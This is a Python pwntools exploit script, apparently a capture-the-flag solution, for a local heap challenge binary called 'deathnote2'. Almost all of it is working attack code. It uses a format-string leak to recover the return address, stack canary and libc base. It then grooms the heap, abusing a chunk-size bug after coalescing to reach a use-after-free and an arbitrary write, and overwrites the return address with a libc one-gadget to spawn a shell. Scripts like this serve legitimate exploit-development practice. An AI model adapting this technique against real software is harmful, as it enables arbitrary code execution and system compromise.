# Pwned locally
# After two big chunks freed and combined, the first chunk's size will emerge a bug that its size equals the sum of the two chunks
# Use this bug to override and lead to UAF
# And this UAF lead to AnyMemWrite with the fake_fd
# Meanwhile, fsb can leak libc_base/ret_addr/canary

from pwn import *
from binascii import *

r=process('./deathnote2')
r.send('\n')
#r.sendlineafter('tell me your name:','%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p')
r.sendlineafter('tell me your name:','%p%p%p%p%p%p%p%p%p%p%p%p%p\x00\x00\x00\x00\x00')
log.success('fsb leak')

r.recvuntil('0x70250x')
leak0=int(r.recv(12),16)
retaddr=leak0-0xd8
log.success('ReturnAddr='+str(hex(retaddr)))

r.recvuntil('0x')
leak1=int(r.recv(16),16)
canary=leak1
log.success('Canary='+str(hex(canary)))

r.recvuntil('(nil)0x')
leak2=int(r.recv(12),16)
libc_base=leak2-0x20830
og1=libc_base+0x45216
og2=libc_base+0x4526a
og3=libc_base+0xf02a4
og4=libc_base+0xf1147
log.success('LibcBase='+str(hex(libc_base)))
log.success('OneGadget='+str(hex(og1)))

r.recvuntil('Invalid!\n')

def WriteName(size,content):
	r.sendlineafter('choice>>','1')
	r.sendlineafter('Size:',str(size))
	r.sendlineafter('Name:',content)
def ShowName(index):
	r.sendlineafter('choice>>','3')
	r.sendlineafter('Page:',str(index))
def DeleteName(index):
	r.sendlineafter('choice>>','2')
	r.sendlineafter('Page:',str(index))
def Bye():
	r.sendlineafter('choice>>','4')
fake_fd=retaddr-0x1f
payload=p64(canary>>8)+p64((og1&0xff)<<56)+p64((0x01<<56)+(og1>>8))

WriteName(32,'00000000')#0
WriteName(192,'11111111')#1
WriteName(192,'22222222')#2
WriteName(32,'33333333')#3 avoid combination
DeleteName(2)
DeleteName(1)
WriteName(0x1a0,'1'*0xd0+p64(0xe0)+p64(fake_fd))#_1
WriteName(0xc0,'22222222')#_2
WriteName(0x50,payload)#4
Bye()

r.interactive()